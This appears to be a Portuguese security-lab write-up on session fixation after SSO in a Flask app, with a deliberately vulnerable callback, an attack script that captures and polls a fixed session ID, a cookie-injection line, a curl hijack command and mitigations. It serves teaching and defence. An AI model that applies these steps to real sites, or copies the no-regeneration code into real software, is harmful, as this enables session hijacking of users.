# A-09 — Session Fixation after SSO

## Descrição

Session Fixation é um ataque em que o atacante força um session ID conhecido
na sessão da vítima **antes** do login. Quando a vítima autentica, o servidor
associa as credenciais àquele session ID — que o atacante já conhece.
O atacante passa a ter acesso à sessão autenticada sem precisar de saber a password.

O ponto crítico: o servidor **não regenera o session ID após autenticação**.
Se regenerasse, o ID fixado pelo atacante tornava-se inútil.

---

## Pré-requisitos

- SP1 a correr em `http://localhost:5001`
- Attacker Server a correr em `http://localhost:9999`
- `VULN_A09_NO_SESSION_REGEN = True` em `sp1/config.py`
- SP1 a usar sessões server-side (`flask-session` com filesystem backend)

---

## Análise do Código

### 1. Flag de controlo — `sp1/config.py`

```python
# True  = sistema VULNERÁVEL
# False = mitigação ATIVA
VULN_A09_NO_SESSION_REGEN = True
```

Esta flag é importada com `from config import *` e afecta exclusivamente
a rota `/callback` — o único momento em que o session ID deve ser regenerado
(imediatamente antes de escrever dados de autenticação na sessão).

---

### 2. Configuração das sessões — `sp1/app.py`

O SP1 usa `flask-session` com backend filesystem. Esta escolha é deliberada
para tornar o ataque possível — o session ID é um valor real guardado no cookie:

```python
# sp1/app.py — configuração de sessões
app.config["SESSION_TYPE"]            = "filesystem"
app.config["SESSION_FILE_DIR"]        = "./flask_session"
app.config["SESSION_COOKIE_NAME"]     = "sp1_session"
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
# ↑ Lax permite envio em navegação cross-site (ex: clicar num link)
# Strict bloquearia a injecção — mas está propositadamente em Lax (VULN)
```

**Porquê `flask-session` e não o Flask padrão?**

O Flask padrão usa cookies assinados (client-side):

```
Cookie: session=eyJuYW1lIjoiYWxpY2UifQ.Zk9...  ← assinado com SECRET_KEY
```

O atacante não consegue forjar a assinatura → Session Fixation **não funciona**.

Com `flask-session` (server-side):

```
Cookie: sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...
```

O cookie é apenas um **identificador** — os dados ficam no servidor em `flask_session/`.
O atacante pode obter um ID válido visitando o SP1 anonimamente e injectá-lo na vítima.

---

### 3. Rota `/callback` — o ponto crítico

```python
@app.route("/callback")
def callback():
    token     = oauth.keycloak.authorize_access_token()
    user_info = token.get("userinfo")

    # ---- A-09: Session Fixation ----
    if VULN_A09_NO_SESSION_REGEN:
        # VULNERÁVEL: não faz nada — mantém o session ID actual
        # Se o ID foi fixado pelo atacante, continua a ser o mesmo
        pass
        # session ID antes:  .eJyrVkrNS87P...  ← controlado pelo atacante
        # session ID depois: .eJyrVkrNS87P...  ← IGUAL

    else:
        # MITIGADO: apaga a sessão actual e força criação de nova
        session.clear()
        # session ID antes:  .eJyrVkrNS87P...  ← controlado pelo atacante
        # session ID depois: .eJyrZkrMS86O...  ← NOVO, aleatório

    # Estes dados são escritos na sessão — seja ela do atacante ou nova
    session["user"]         = user_info
    session["access_token"] = token.get("access_token")
    # Com VULN=True: os dados de "bob" ficam associados ao ID do atacante
    # Com VULN=False: os dados ficam numa sessão nova que o atacante desconhece
```

**O `session.clear()` do `flask-session` faz duas coisas:**
1. Apaga o ficheiro da sessão antiga em `flask_session/`
2. Na próxima escrita (`session["user"] = ...`), cria um novo ficheiro com um ID diferente
3. O browser recebe `Set-Cookie: sp1_session=<NOVO_ID>` na resposta

---

### 4. Como o atacante obtém o session ID — `attacks/a09_session_fixation.py`

```python
def get_fresh_session_id():
    """
    Visita o SP1 sem fazer login.
    O SP1 cria uma sessão vazia e devolve o cookie sp1_session.
    """
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar)
    )
    opener.open("http://localhost:5001/")
    # SP1 responde com:
    # Set-Cookie: sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; Path=/

    for cookie in jar:
        if cookie.name == "sp1_session":
            return cookie.value   # ← ID capturado
```

O SP1 cria uma sessão para qualquer visita (incluindo não autenticadas) —
este comportamento do `flask-session` é que torna o ataque possível.

---

### 5. Como o atacante verifica se a sessão foi autenticada

```python
def check_authenticated_access(session_id):
    """
    Tenta aceder a /dashboard com o session ID fixado.
    Se não houver redirect para /login → sessão autenticada.
    """
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            raise urllib.error.HTTPError(...)
        http_error_301 = http_error_302
        http_error_303 = http_error_302

    req = urllib.request.Request("http://localhost:5001/dashboard")
    req.add_header("Cookie", f"sp1_session={session_id}")

    try:
        opener = urllib.request.build_opener(NoRedirect())
        opener.open(req)
        return True    # 200 OK → sessão autenticada → ATAQUE SUCEDIDO
    except urllib.error.HTTPError as e:
        if e.code in (301, 302, 303):
            return False  # redirect para /login → ainda não autenticada
```

O script verifica de 10 em 10 segundos. Quando a vítima faz login,
o SP1 escreve `session["user"] = bob` na sessão do atacante → 200 OK.

---

## Diagrama do Ataque

```
ATACANTE                    SP1 :5001                    VÍTIMA
   │                            │                           │
   │── GET / ───────────────────►│                           │
   │   (sem cookie)              │── cria sessão vazia       │
   │◄── Set-Cookie: sp1_session=SID_FIXO ──────────────────  │
   │                            │                           │
   │  [Injeta SID_FIXO no browser da vítima]                 │
   │  document.cookie = "sp1_session=SID_FIXO; path=/"       │
   │ ──────────────────────────────────────────────────────► │
   │                            │                           │
   │                            │◄── GET / (Cookie: SID_FIXO)│
   │                            │◄── redirect → Keycloak    │
   │                            │◄── POST login (credenciais │
   │                            │          reais de bob)     │
   │                            │                           │
   │                            │  if VULN_A09:             │
   │                            │    pass  ← NÃO regenera   │
   │                            │  session["user"] = bob    │
   │                            │  (escrito no SID_FIXO)    │
   │                            │                           │
   │── GET /dashboard ──────────►│                           │
   │   Cookie: SID_FIXO          │                           │
   │◄── 200 OK (dados de bob) ───│                           │
   │                            │                           │
[ACESSO À SESSÃO DE BOB SEM SABER A PASSWORD]
```

---

## Passos da Demonstração

### 1. Verificar configuração vulnerável

```python
# sp1/config.py
VULN_A09_NO_SESSION_REGEN = True
```

### 2. Correr o script de ataque

```bash
python attacks/a09_session_fixation.py
```

O script:
- Visita o SP1 e captura o `sp1_session` cookie
- Mostra o comando JavaScript a executar no browser da vítima
- Fica em loop verificando se a sessão ficou autenticada

### 3. Injectar o cookie no browser da vítima

No browser da vítima, abrir a consola (F12 → Console) e executar:

```javascript
document.cookie = "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA...; path=/";
```

### 4. Vítima faz login

No mesmo browser, aceder a `http://localhost:5001` e fazer login com `bob` / `bob123`.

### 5. Script detecta o ataque com sucesso

O script mostra o comando para aceder como bob:

```bash
curl -s http://localhost:5001/dashboard \
     -b "sp1_session=.eJyrVkrNS87PLShKLUpVslIqLU4tykvMTQUA..." \
     -L
```

---

## Mitigação — Análise do Código

```python
# sp1/config.py
VULN_A09_NO_SESSION_REGEN = False
```

**Efeito no `/callback`:**

```python
if VULN_A09_NO_SESSION_REGEN:
    pass   # ← NÃO executado

else:
    session.clear()   # ← EXECUTADO: destrói a sessão do atacante
    # flask-session apaga flask_session/<SID_FIXO>
    # Na próxima escrita é criado flask_session/<SID_NOVO>

session["user"] = user_info
# Os dados de bob ficam em <SID_NOVO> — que o atacante não conhece
# O SID_FIXO aponta para uma sessão vazia/inexistente
```

**Defesas adicionais:**

```python
# sp1/app.py — com mitigação completa
app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
# Strict: o cookie só é enviado em navegação first-party
# → um link enviado pelo atacante não transporta o cookie fixado

app.config["SESSION_COOKIE_HTTPONLY"] = True
# Já activo: impede que JavaScript leia o cookie
# → XSS não consegue roubar o session ID

app.config["SESSION_COOKIE_SECURE"] = True
# Produção: cookie só viaja em HTTPS
# → MITM não consegue interceptar/injectar o cookie
```

**Tabela de condições:**

| Condição | `VULN=True` | `VULN=False` |
|----------|-------------|--------------|
| Session ID fixado antes do login | ✅ mantido | ❌ destruído e substituído |
| Atacante acede com ID fixado | ✅ sessão autenticada | ❌ sessão vazia |
| SameSite=Strict activo | ❌ não | ✅ sim (mitigação adicional) |

---

## Condições necessárias para o ataque

| Condição | Presente no lab |
|----------|-----------------|
| Sessões server-side com ID no cookie | ✅ `flask-session` filesystem |
| Session ID não regenerado após login | ✅ `VULN_A09 = True` |
| Atacante consegue injectar cookie | ✅ consola F12 / XSS / MITM |

> **Nota:** Sessões client-side (cookie assinado, como o Flask padrão)
> **não são vulneráveis** a este ataque — o atacante não pode forjar
> a assinatura criptográfica. É por isso que o lab usa `flask-session`
> com filesystem, onde o cookie é apenas um identificador opaco.

---

## Referências

- [OWASP — Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [CWE-384: Session Fixation](https://cwe.mitre.org/data/definitions/384.html)
- [IETF RFC 6819 — OAuth 2.0 Threat Model — Session Fixation](https://datatracker.ietf.org/doc/html/rfc6819#section-4.6.3)
